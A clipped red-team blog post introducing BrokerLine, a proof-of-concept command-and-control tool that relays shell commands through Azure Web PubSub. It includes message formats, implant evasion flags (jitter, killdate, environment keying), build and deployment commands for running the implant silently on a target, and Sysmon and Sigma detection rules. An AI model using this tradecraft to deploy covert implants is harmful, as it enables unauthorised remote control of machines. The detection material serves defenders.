---
title: MQTT and Friends - Introducing BrokerLine
source: https://blog.zsec.uk/brokerline-pubsubpwn/
source_host: blog.zsec.uk
clip_date: 2026-09-15T10:20:45+08:00
trace_id: bdcf4d04-fcbb-459e-9f2f-92096d266926
content_hash: c6c9597a02f4c025797dac87dccc59ea253a5b2806580208bb71eb94c46349d5
status: synced
tags:
  - 安全工具
  - 协议分析
series: null
feed_source: zsec·逆向安全
ai_summary: 基于 Azure Web PubSub 的 WebSocket/MQTT 通道可被改造成轻量级 C2，BrokerLine 用 BrokerLineServer（服务端）与 BrokerLineClient（植入体）验证了该思路并给出检测规则。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3dc75244-d011-81e4-aee1-c30badb36ea4
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 基于 Azure Web PubSub 的 WebSocket/MQTT 通道可被改造成轻量级 C2，BrokerLine 用 BrokerLineServer（服务端）与 BrokerLineClient（植入体）验证了该思路并给出检测规则。
> 
> - **通道设计：** Azure Web PubSub 托管实时通信，默认 TLS 包装的 WebSocket；服务端经 REST API 发送命令，客户端以 `GetClientAccessUri()` 签发的 JWT 连接，`SendToAllAsync()` 广播或 `SendToUserAsync()` 定向到指定 ID。
> - **消息格式：** 全部为 camelCase 字段的 JSON；命令与结果内容 base64 编码，定向命令的 clientId 放在路由层而非载荷；心跳携带明文主机名、用户名、OS。
> - **客户端 ID 派生：** `SHA256("<MachineName>-<UserName>")` 十六进制小写取前 12 位（如 `a1b2c3d4e5f6`），同一主机重连 ID 稳定，PubSub 侧看不到明文主机与用户。
> - **OPSEC 参数：** `--timeout`、`--heartbeat`、`--jitter`、`--sleep`、`--killdate`、`--key`、`--hours`、`--maxout` 控制超时、心跳与重连抖动、首次连接延迟、时间窗、环境键控与输出截断；编译用 Native AOT，故不能加 `-p:PublishSingleFile=true`。
> - **检测面：** Sysmon 事件 22/3/1（DNS、443 连接、`cmd.exe /c` 且父进程非 explorer/cmd/powershell）、Sigma 规则匹配 `.webpubsub.azure.com` 出站与 `^[0-9a-f]{12}$` 格式 userId（ConnectivityLogs）；代理侧可见 HTTP CONNECT + 101 Switching Protocols，及默认 UA `websocket-client`。

![MQTT and Friends -  Introducing BrokerLine](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8fd503c728ee210f.jpg)

When doing red team assessments, you come across all manner of technologies. Obscure cloud services crop up all the time, and something new always seems to be in play. A red team I did a number of years ago led me down another Azure rabbit hole, this time to the Publish/Subscribe (PubSub) service.

For those unaware (which until I read about it, included me), Azure Web PubSub is a managed service that enables real-time communication between web applications and clients. It can be used for WebSocket comms and a range of other things.

I've been on a bit of a C2 arc recently, looking at different avenues. Despite not being a fan of using C2 or depending on it for operations, I like to explore the "everything as a C2 channel" side quests now and again.

PubSub is built on WebSocket technology and lets you add real-time features to your applications without managing the underlying infrastructure. I'm no stranger to WebSockets, having written about them in the past.

Per Microsoft's description, Azure Web PubSub simplifies the development, deployment, and management of real-time web applications using WebSockets, including Message Queuing Telemetry Transport (MQTT) over WebSocket; making it a solid fit as a C2 channel. Using WebSockets for C2 is nothing new, many frameworks already use them because they offer real-time updates, in some cases they're effective for blending in because WebSocket traffic is so noisy, which is ironic for a C2 channel, plus many electron apps use web sockets by default for communications so it is far easier to blend with them.

## Building an Example App

To learn something I often have to build it first, understand how it works, then dive into the adversarial element. Microsoft provides a [quickstart example](https://learn.microsoft.com/en-us/azure/azure-web-pubsub/samples-platforms-and-frameworks?ref=blog.zsec.uk) for building a simple chat app with PubSub, so I started there.

The example is straightforward. You stand up a PubSub service in Azure, grab the connection string, and write a small.NET app that connects as a WebSocket client. Messages sent to the hub get broadcast to every connected client. The key classes are:

-   `WebPubSubServiceClient` on the server side, which is a REST API wrapper for sending messages into a hub
-   A standard WebSocket connection on the client side, authenticated with a token from `GetClientAccessUri()`

The server calls `SendToAllAsync()` and every connected WebSocket client receives the message. No polling, no queue management, no infrastructure and thankfully Azure handles the fan-out.

What caught my attention was how cleanly this maps to a C2 pattern, the server is the operator console, the clients are implants, and the hub is the channel. The PubSub service handles connection management, reconnection, and message routing. You get WebSocket transport with TLS by default, and the traffic blends in with legitimate Azure service calls.

The example also showed `SendToUserAsync()`, which lets you address a specific connected client by a user ID you assign at connection time. That gives you per-implant targeting without any routing logic on your end.

After getting the chat example working, I stripped it down and started building something purpose-built.

## BrokerLine

A very lightweight, task-driven C2 relying exclusively on the Azure PubSub service. It has two components:

-   **BrokerLineServer** is the operator console. It connects to the PubSub hub via the REST API to send commands and opens a WebSocket listener to receive results and heartbeats. Supports broadcasting to all clients or targeting a specific one by ID.
-   **BrokerLineClient** is the implant. It connects to the hub over WebSocket, executes received commands through the OS shell (`cmd.exe` on Windows, `/bin/sh` on Linux), and sends full execution results back to the server. It has configurable heartbeat interval, exponential backoff reconnection with jitter, a configurable command timeout, silent mode, and sends a heartbeat on a randomized interval so the operator knows which clients are alive.

Commands are base64 encoded in transit, and the whole thing runs over TLS-wrapped WebSockets.

### Message Format

All messages are JSON with camelCase field names.

**Command (targeted):** The server uses Azure's `SendToUserAsync` to route by client ID. The client ID is embedded in the routing layer, not in the JSON payload.

```json
{
  "type": "command",
  "content": "<base64-encoded shell command>",
  "timestamp": "2026-07-29T12:00:00Z",
  "source": "BrokerLineServer"
}
```

**Command (broadcast):** When sending to all clients the server uses `SendToAllAsync` and sets `type` to `broadcast`. The client accepts both `command` and `broadcast`.

```json
{
  "type": "broadcast",
  "content": "<base64-encoded shell command>",
  "timestamp": "2026-07-29T12:00:00Z",
  "source": "BrokerLineServer"
}
```

**Result:**

```json
{
  "type": "result",
  "clientId": "a1b2c3d4e5f6",
  "data": {
    "command": "whoami",
    "exitCode": 0,
    "output": "<base64-encoded stdout>",
    "error": "<base64-encoded stderr>",
    "executedAt": "2026-07-29T12:00:00.123Z",
    "duration": 0.042,
    "success": true
  }
}
```

**Heartbeat:**

```json
{
  "type": "heartbeat",
  "clientId": "a1b2c3d4e5f6",
  "hostname": "DESKTOP-01",
  "username": "alice",
  "os": "Microsoft Windows 10.0.19045",
  "timestamp": "2026-07-29T12:00:00Z"
}
```

### Client ID Derivation

The implant derives a stable identifier at startup:

```
raw    = "<MachineName>-<UserName>"
hash   = SHA256(UTF8(raw))
id     = lowercase(hex(hash))[0:12]     // first 12 hexadecimal characters
```

A real example ID looks like `a1b2c3d4e5f6`. The same host produces the same ID across reconnections. The actual hostname and username never appear in plaintext in the PubSub service. Azure user routing happens via the hashed ID; the real values travel only in heartbeat payloads over the TLS connection.

### GetClientAccessUri()

`GetClientAccessUri()` gives clients a valid WebSocket URL containing a signed JWT. The client never touches the access key directly.

```csharp
var serviceClient = new WebPubSubServiceClient(connectionString, hubName);

var clientUri = serviceClient.GetClientAccessUri(
    userId: clientId,   // 12-char hex derived from machine+user
    roles: new[] { "webpubsub.sendToGroup.results" }
);
// Returns wss://your-hub.webpubsub.azure.com/client/hubs/ops?access_token=<signed-jwt>
```

### Prerequisites

-   Visual Studio 2022 (optional, you can use the dotnet commands from cmd if you prefer)
-   .NET SDK 8 or newer
-   Azure.Messaging.WebPubSub (NuGet)
-   Websocket.Client (NuGet, by Mariusz Kotas)

For development and testing, pass a connection string and hub name to both binaries:

```
Endpoint=https://<resource-name>.webpubsub.azure.com;AccessKey=<your-access-key>;Version=1.0;
```

### Running

To test, you don't need to compile to an exe. Use the following command from inside the project folder:

```
dotnet run "Endpoint=https://<resource-name>.webpubsub.azure.com;AccessKey=<your-access-key>;Version=1.0;" "Hub"
```

The client also accepts optional flags:

```css
BrokerLineClient.exe <connection-string> <hub-name> --silent --timeout 60 --heartbeat 60 --jitter 15 --sleep 120 --hours 08-17
```

| Flag | Description | Default |
| --- | --- | --- |
| `--silent` | Suppress all console output | off |
| `--timeout <sec>` | Per-command execution timeout | 30  |
| `--heartbeat <sec>` | Heartbeat interval in seconds | 30  |
| `--jitter <sec>` | Max randomisation for heartbeats, responses, and reconnects | 10  |
| `--sleep <sec>` | Max random delay before first connection | 0   |
| `--killdate <YYYY-MM-DD>` | Self-terminate after this UTC date | none |
| `--key <VAR=VAL>` | Only run if env var matches (`VAR` alone checks existence) | none |
| `--hours <S-E>` | UTC hour range for beaconing and command execution (e.g. `08-17`, `22-06`) | always |
| `--maxout <bytes>` | Truncate command output before sending (`0` = no limit) | 65536 |

All value-taking flags validate their input and exit with a non-zero code on failure. Unknown flags produce an error.

### OPSEC Considerations

A few things worth calling out on the operational side. The client ID used for PubSub routing is the first 12 characters of the SHA-256 hex digest of `<MachineName>-<UserName>`, so the PubSub service itself never sees those values in plaintext. The operator still gets the real hostname, username, and OS from heartbeat payloads, which travel over the TLS WebSocket.

Timing is randomized across the board. Heartbeats, command responses, and reconnection attempts all have configurable jitter applied. The `--heartbeat` flag controls the base interval (default 30 seconds); jitter is added on top of it.

The `--sleep` flag adds an initial random delay before the first connection, which breaks the "execute then immediate callback" pattern. The `--hours` flag gates both heartbeats and command execution to a UTC time window. Outside that window the implant stays connected but ignores inbound commands and suppresses heartbeats. This is useful for blending with business-hours traffic.

Environment keying via `--key` lets you tie execution to a specific domain or machine characteristic. If the check fails the implant exits without producing any network traffic or console output. The `--killdate` flag does the same after a given date, and is re-checked on every heartbeat cycle so the implant cleans itself up even if it was sleeping at the time.

Output truncation via `--maxout` caps the size of results sent back. A 10 MB directory listing going over the wire in a single WebSocket frame is a good way to attract attention.

TLS protects data in transit; without Azure-side diagnostic logging enabled, the content of messages is not observable at the network layer from outside the service. That said, Azure's own diagnostic logs can capture connectivity and messaging metadata regardless of what the implant does — see the Detection section below.

### Compiling

This is a.NET solution so building it in VS produces DLLs. If you want self-contained executables, navigate into each project's root folder and run:

```
dotnet publish -r win-x64 --self-contained true
```

Because each project is tagged to enable Native AOT (ahead-of-time) compilation, these compile directly to native code and skip the JIT process. This also means you can't compile with the `-p:PublishSingleFile=true` argument.

### Build Automation

Build scripts are included for PowerShell and Make. Both default to `win-x64`, `Release` configuration, and `./build` output. Artifacts land in `<output>/<runtime>/server/` and `<output>/<runtime>/client/`.

**Native AOT cross-compilation:** `win-x64` / `win-arm64` builds require a Windows host with the MSVC toolchain. `linux-x64` / `linux-arm64` builds require a Linux host with clang and the matching `sysroot`. Building on a non-matching host will fail during the link phase with a clear toolchain error.

**PowerShell:**

```powershell
.\build.ps1                              # server + client, win-x64
.\build.ps1 -Target server              # server only
.\build.ps1 -Target client              # client only
.\build.ps1 -Runtime linux-x64          # build for Linux
.\build.ps1 -OutputDir .\dist           # custom output directory
.\build.ps1 -Configuration Debug        # Debug build
.\build.ps1 -Clean                      # delete build output and exit
```

**Make:**

```python
make                                    # server + client, win-x64
make server                             # server only
make client                             # client only
make RUNTIME=linux-x64                  # build for Linux
make OUTPUT_DIR=dist                    # custom output directory
make CONFIGURATION=Debug                # Debug build
make clean                              # wipe build output
```

Supported runtimes are `win-x64`, `win-arm64`, `linux-x64`, and `linux-arm64`.

## Setting Up Azure Web PubSub

Before you can use BrokerLine you need a PubSub service stood up in Azure. You can do this through the portal or the CLI.

### Via Azure CLI

```bash
az login

az group create --name brokerline-rg --location eastus

az webpubsub create \
  --name brokerline-pubsub \
  --resource-group brokerline-rg \
  --location eastus \
  --sku Free_F1
```

The free tier gives you 20 concurrent connections and 20K messages per day, which is more than enough for testing. Standard (S1) bumps that to 1K connections per unit if you need more headroom.

### Via Azure Portal

Create a resource, search for "Web PubSub", and fill in the basics:

```yaml
Subscription:    [Your subscription]
Resource Group:  brokerline-rg (create new or use existing)
Resource Name:   brokerline-pubsub
Region:          [Closest to your targets]
Pricing Tier:    Free (F1)
Unit Count:      1
```

### Grabbing the Connection String

Once the service is deployed, go to **Settings > Keys** in the portal and copy the Primary Connection String. It looks like this:

```
Endpoint=https://brokerline-pubsub.webpubsub.azure.com;AccessKey=<your-access-key>;Version=1.0;
```

If you're using the CLI:

```bash
az webpubsub key show \
  --name brokerline-pubsub \
  --resource-group brokerline-rg \
  --query primaryConnectionString \
  --output tsv
```

Or via PowerShell:

```powershell
$keys = Get-AzWebPubSubKey -ResourceGroupName brokerline-rg -Name brokerline-pubsub
$keys.PrimaryConnectionString
```

### Configuring the Hub

PubSub uses "hubs" to group connections. Both BrokerLineServer and BrokerLineClient need to point at the same hub name. You don't need to pre-create hubs in the portal, they're created on first use. Just pick a name and pass it as the second argument to both binaries.

### Testing Connectivity

Quick sanity check before deploying anything:

```csharp
using Azure.Messaging.WebPubSub;

var client = new WebPubSubServiceClient("your-connection-string", "your-hub");
var uri = client.GetClientAccessUri();
Console.WriteLine($"Got client URI: {uri}");
```

If that returns a URI, your service is up and reachable.

### Running BrokerLine Against It

Start the server (operator side):

```bash
BrokerLineServer.exe "Endpoint=https://brokerline-pubsub.webpubsub.azure.com;AccessKey=<your-key>;Version=1.0;" ops
```

Then the client on the target:

```bash
BrokerLineClient.exe "Endpoint=https://brokerline-pubsub.webpubsub.azure.com;AccessKey=<your-key>;Version=1.0;" ops --silent
```

Both are pointed at the same hub (`ops`), so commands issued from the server get picked up by every client subscribed to that hub.

### Key Rotation

Azure gives you primary and secondary keys. If you need to rotate, switch your tooling to the secondary key first, then regenerate the primary. Do this from **Settings > Keys** in the portal or:

```bash
az webpubsub key regenerate \
  --name brokerline-pubsub \
  --resource-group brokerline-rg \
  --key-type Primary
```

## Detection

Azure Web PubSub sits inside Microsoft's infrastructure and every connection is TLS-wrapped, so message payloads are not visible on the wire without Azure-side diagnostic logging. What remains observable from the endpoint and from Azure itself is:

-   DNS resolution to `*.webpubsub.azure.com`
-   An outbound WebSocket connection to port 443 on those endpoints
-   Process behaviour when the shell executes each command
-   Azure diagnostic logs (ConnectivityLogs, MessagingLogs, HttpRequestLogs) — none enabled by default

Azure-side detections are worth prioritising because the implant's flags (`--silent`, etc.) cannot suppress what Azure logs about its own service.

### Sysmon

**Event ID 22 (DnsQuery):** Most workstations have no reason to resolve `*.webpubsub.azure.com`.

```xml
<RuleGroup name="PubSubDNS" groupRelation="or">
  <DnsQuery onmatch="include">
    <QueryName condition="end with">.webpubsub.azure.com</QueryName>
  </DnsQuery>
</RuleGroup>
```

**Event ID 3 (NetworkConnect):** Persistent connection to port 443 from an unrecognised process.

```xml
<RuleGroup name="PubSubNetwork" groupRelation="or">
  <NetworkConnect onmatch="include">
    <DestinationHostname condition="end with">.webpubsub.azure.com</DestinationHostname>
  </NetworkConnect>
</RuleGroup>
```

**Event ID 1 (ProcessCreate):** Each command spawns `cmd.exe /c` with `CreateNoWindow = true`.

```xml
<RuleGroup name="CmdFromNetworkProc" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Rule name="ShellFromImplant" groupRelation="and">
      <Image condition="end with">cmd.exe</Image>
      <CommandLine condition="contains"> /c </CommandLine>
      <ParentImage condition="end with" negate="true">explorer.exe</ParentImage>
      <ParentImage condition="end with" negate="true">cmd.exe</ParentImage>
      <ParentImage condition="end with" negate="true">powershell.exe</ParentImage>
      <ParentImage condition="end with" negate="true">pwsh.exe</ParentImage>
    </Rule>
  </ProcessCreate>
</RuleGroup>
```

### Sigma

**Outbound connection to Azure Web PubSub:**

```yaml
title: Outbound Connection to Azure Web PubSub
id: f4a9c2d1-83b7-4e05-b6f2-39d78a1cef24
status: experimental
description: >
  Detects outbound connections to Azure Web PubSub endpoints.
  The service has been used as a WebSocket-based C2 channel.
tags:
  - attack.command_and_control
  - attack.t1102.002
  - attack.t1071.001
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Initiated: "true"
    DestinationHostname|endswith: ".webpubsub.azure.com"
  condition: selection
falsepositives:
  - Applications legitimately using Azure Web PubSub for real-time features
level: medium
```

**Hex-format user ID in Azure Web PubSub connectivity logs:**

BrokerLine client IDs are the first **12 lowercase hexadecimal characters** of the SHA-256 of `<MachineName>-<UserName>`, producing IDs like `a1b2c3d4e5f6`. Legitimate PubSub applications typically use human-readable names or GUID-format identifiers.

```yaml
title: Azure Web PubSub Connection with Hex-Format User ID
id: 3d9e1f72-a4c8-4b67-8e2d-5f0a1c9b7e43
status: experimental
description: >
  Detects client connections to Azure Web PubSub where the userId
  matches the 12-character lowercase hexadecimal pattern used by
  BrokerLine implant ID derivation.
tags:
  - attack.command_and_control
  - attack.t1102.002
logsource:
  product: azure
  service: azure.webpubsub
detection:
  selection:
    category: ConnectivityLogs
    operationName: ClientConnectionConnected
    userId|re: "^[0-9a-f]{12}$"
  condition: selection
falsepositives:
  - Applications that generate 12-character hexadecimal client identifiers
level: high
```

### Network Proxy

WebSocket connections to PubSub appear at the proxy layer as an HTTP CONNECT tunnel to port 443 followed by a 101 Switching Protocols response. The connection stays open with low periodic traffic (heartbeats), with larger bursts when commands run and results return.

The `Websocket.Client` library sets the HTTP user agent to `websocket-client` by default unless overridden. Filtering proxy logs for that string alongside `webpubsub.azure.com` tends to produce few false positives in environments that don't run.NET WebSocket clients directly.

## Wrapping Up

Azure Web PubSub turned out to be a surprisingly clean fit for C2. The infrastructure is managed, the transport is TLS by default, and the routing model maps almost directly onto the operator/implant pattern without any custom plumbing. The tricky part is the same as it always is operating carefully enough that you don't light up the detections above before you've achieved your objectives.

BrokerLine is a proof of concept, not a production implant and the point was to explore the channel and understand it well enough to both use it and detect it. Hopefully the detection section is useful regardless of which side of the fence you sit on and if you are in the red sphere you better understand how to modify to evade.

The full source is on GitHub:

If this kind of thing interests you C2 development, living-off-the-land techniques, and the tradecraft behind red team operations; I go into a lot more depth in my red team course over at [lms.zsec.red](https://lms.zsec.red/?ref=blog.zsec.uk). It covers the practical side of offensive security from initial access through to post-exploitation, with a focus on understanding what you're doing and why rather than just running tools.
